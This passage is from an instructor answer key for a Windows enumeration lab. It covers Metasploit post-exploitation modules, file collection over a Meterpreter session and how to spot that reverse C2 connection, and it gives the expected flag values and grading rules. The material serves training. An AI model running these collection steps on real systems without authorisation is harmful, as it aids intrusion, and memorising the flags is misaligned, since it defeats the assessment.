- `netstat -ano` and `Get-NetTCPConnection` are the B03.M01 Windows listener baseline. Equivalent socket commands from Microsoft Learn or ATT&CK Discovery are valid.
- Once students identify a listener on port `80`, they can justify investigating IIS and the web root.
- Correlating the port owner back to process/service evidence reinforces that port enumeration should connect to host purpose.

Expected listener findings:

- Port `80` is open for IIS in the default build.
- Other baseline Windows listeners such as `3389`, `5985`, and `445` may also be present, depending on the base image and range setup.

Investigate the web server and recover the config flag:

```
curl.exe -I http://127.0.0.1/
dir C:\
dir C:\inetpub
dir C:\inetpub\wwwroot
type C:\inetpub\wwwroot\db_config.txt
curl.exe http://127.0.0.1/db_config.txt
```

Why:

- `curl.exe -I` sends an HTTP HEAD request. The `-I` option prints status and response headers only, which is enough to prove a web server is answering on `127.0.0.1` (`HTTP/1.1 200` and `Server: Microsoft-IIS/...`). Students stay in the existing `cmd.exe` shell; they do not need PowerShell for this.
- Listener evidence on port `80` plus that IIS `Server` header justifies walking `C:\` → `C:\inetpub` → `C:\inetpub\wwwroot` with `dir`, then `type` of the file that listing exposes. That is the Lab 1.1 analogue.
- `curl.exe -I` may already show `X-Backend-Service`. Do not treat that header as this step’s flag; it is Step 6. This step recovers `connection_secret` from disk (`type`) and from the same path over HTTP (`curl.exe` without `-I`).

Expected `type C:\inetpub\wwwroot\db_config.txt` / `curl.exe [http://127.0.0.1/db_config.txt](http://127.0.0.1/db_config.txt)` output:

```
# DB connection (assessment artifact)
db_host=localhost
db_user=cs_ops_app
connection_secret=OPAL-MATRIX
```

Expected config findings:

- The web root contains `db_config.txt`.
- The file contains a `connection_secret=` line.
- That value is the config flag.

Flag recovered:

- `config_flag` = `OPAL-MATRIX` by default.

Metasploit module options:

```
background
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target_ip>
set RPORT 80
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\inetpub\\wwwroot
set FILE_GLOBS db_config.txt
run
loot
```

Why:

- `dir_scanner` demonstrates web-content discovery without assuming prior filename knowledge.
- `enum_files` then collects the discovered config file directly from disk as a second evidence path to `connection_secret`.

### 6. Look deeper into IIS response metadata and recover the port flag

Now inspect the web service beyond the web-root files:

```
curl.exe -I http://127.0.0.1/
```

Why:

- Step 5 proved that IIS is listening and that `wwwroot` contains a config artifact. Re-run `curl.exe -I` (or re-read the Step 5 HEAD output) and this time treat the custom header as the objective.
- The default lab does not place the port flag in any file under `C:\inetpub\wwwroot`. Students need listener evidence on port `80`, then HTTP response-header inspection.

Expected `curl.exe -I [http://127.0.0.1/](http://127.0.0.1/)` excerpt:

```
HTTP/1.1 200 OK
X-Backend-Service: TIDAL-ROUTE
Server: Microsoft-IIS/...
```

Flag recovered:

- `port_flag` = `TIDAL-ROUTE` by default.

Teaching point:

- The default lab does not place the port flag in any file under `C:\inetpub\wwwroot`. Recover it from `curl.exe -I` response headers, then confirm the same value in `applicationHost.config` with `appcmd` / `findstr`. The IIS site is reachable on all interfaces, so local or remote HTTP collection both work; the flag value travels in response metadata either way.

Configuration-side discovery path:

```
dir C:\Windows\System32\inetsrv
dir C:\Windows\System32\inetsrv\config
C:\Windows\System32\inetsrv\appcmd.exe list site
C:\Windows\System32\inetsrv\appcmd.exe list config "Default Web Site" /section:httpProtocol
type C:\Windows\System32\inetsrv\config\applicationHost.config | findstr "X-Backend-Service"
```

Why:

- Students who go beyond response inspection should still be able to identify where the header is configured.
- `dir` of `C:\Windows\System32\inetsrv` then `config` locates the IIS install and its server-level config tree. That path is not under `C:\inetpub\wwwroot`.
- `appcmd.exe` is the IIS command-line manager. `list site` names configured sites (the CMD equivalent of listing websites). `list config "Default Web Site" /section:httpProtocol` dumps the effective HTTP protocol section for that site, including custom headers.
- Students know the site name `Default Web Site` from `appcmd list site` and the header name `X-Backend-Service` from `curl.exe -I`. `findstr "X-Backend-Service"` filters `applicationHost.config` to the matching line; `type` is the full-file read if they want context around that line.
- The header is defined in `C:\Windows\System32\inetsrv\config\applicationHost.config` under a `<location path="Default Web Site">` block.

Expected `appcmd.exe list config "Default Web Site" /section:httpProtocol` excerpt:

```
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="X-Backend-Service" value="TIDAL-ROUTE" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

Expected `findstr "X-Backend-Service"` excerpt:

```
        <add name="X-Backend-Service" value="TIDAL-ROUTE" />
```

Metasploit module option:

```
background
use auxiliary/scanner/http/http_version
set RHOSTS <target_ip>
set RPORT 80
run

use auxiliary/scanner/http/http_header
set RHOSTS <target_ip>
set RPORT 80
run
```

Why:

- `http_version` confirms an HTTP service on the discovered listener using a scanner module.
- `http_header` retrieves the response headers from the same target, which is the framework-driven equivalent of `curl.exe -I` for capturing the custom header that carries the port flag.

### 7. Identify the active Meterpreter/C2 connection

From the host shell:

```
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection -State Established | Sort-Object LocalPort | Format-Table -AutoSize
```

In Meterpreter, match process ID context if needed:

```
getpid
ps
```

Why:

- The student packet tasks live connections, not only listeners. `netstat` / `Get-NetTCPConnection` are the B03.M01 Windows follow-up after the listener pass.
- In this delivery, the key management path is the reverse Meterpreter channel back to the handler/team server.
- Correlating established sockets with process IDs is the easiest way to confirm which connection is tied to the active session.

Artifact answer:

- Grade the remote address/port against the actual handler/team-server endpoint used for the Meterpreter session in your environment.

Metasploit module option:

```
background
use post/windows/gather/tcpnetstat
set SESSION <meterpreter_session_id>
run
```

Why:

- This produces session-associated TCP connection data through a `post` module.
- It provides an alternate evidence source for established connections before correlating back to handler infrastructure.

### 8. Close with the "what is this server?" summary

Students should be able to conclude that this is a standard Windows Server providing at least:

- Administrative services such as SMB, RDP, and/or WinRM depending on the deployed baseline
- An active reverse management/C2 session during the exercise
- IIS on port `80`
- A repeating `SYSTEM` scheduled task that resembles an operational backup job
- A flag-bearing application log and task runtime report discovered from process/task evidence
- Service accounts such as `svc_backup` and `app_runner`
- Operational artifacts in logs and web config files that are discoverable through normal host enumeration

That is the full-system picture the lab is trying to build: processes, scheduled tasks, logs, ports, web service evidence, users, files, and conclusions tied together into one coherent assessment.

## Troubleshooting and Confirmation

- If `psexec` / Meterpreter fails, confirm the ops VM, `RHOSTS`, a reachable `LHOST`, SMB/445, and Access-table credentials versus any range-rotated SMB values.
- If verbose `schtasks /query /fo LIST /v` is unreadable or truncated, list names first with `/fo LIST`, then inspect the custom task with `/tn`.
- If no process shows `-AppLogPath` or `-ProcessFlag`, that is normal outside the daily window and after a reboot. The `-AppLogPath` writer starts when Puppet applies the lab. It is not started by `CS_OPS_Backup`. The scheduled task runs only inside its daily window (on this image, about `01:00`–`09:00` local) and is set to `Stop On Battery Mode, No Start On Batteries`. A Last Result of `-2147020576` (`0x800710E0`) outside that window is not a missing flag. Recover `process_flag` from the `CS_OPS_Backup` action. Recover `log_flag` from `C:\ProgramData\cs_ops\logs\app.log`. `dir C:\ProgramData` shows `cs_ops` even when the writer process is gone.
- If `curl.exe -I` shows `X-Backend-Service` during the web-root step, that header is the port flag. Recover it in Step 6. The web-root step is `connection_secret` from `db_config.txt`.
- If recovered flag strings, task names, or header names differ from this key, grade the Hiera values for that run, not the defaults table.

## Artifact Answers

1. **Process / scheduled task:** The custom backup task `CS_OPS_Backup` runs as `SYSTEM`. The task log names the computer account (`BULL-12$` on the default hostname), because the script records `$env:USERNAME`.
2. **Logs:** The log entry containing the log flag names `svc_backup`; the default flag-bearing app log is `C:\ProgramData\cs_ops\logs\app.log`.
3. **Listening ports:** Expect `80/tcp` for IIS in the default build. Other common baseline listeners may include `3389/tcp`, `5985/tcp`, and `445/tcp` depending on your Windows baseline and range configuration.
4. **Config artifact:** The `connection_secret` value is `OPAL-MATRIX` by default.
5. **Port flag:** The IIS custom response header `X-Backend-Service` contains `TIDAL-ROUTE` by default.
6. **Users:** Students should identify the student access account plus `svc_backup` and `app_runner` at minimum in the default build.
7. **Active connections:** The remote address/port should match the Meterpreter handler/team-server endpoint visible in the active reverse session.
8. **Scheduled task cadence:** Puppet's default start time is `00:00`. On this image, `schtasks` shows Start Time `1:00:00 AM` (`StartBoundary` `2024-01-15T01:00:00-04:00`). Grade a daily trigger that repeats every `5` minutes for `480` minutes (through `09:00` local). Do not require a literal `00:00` string in `schtasks`.

## Acceptable Answers

Accept equivalent correct answers for service names and port descriptions. For flags, require exact string matches unless the exercise instructions explicitly allow partial credit.

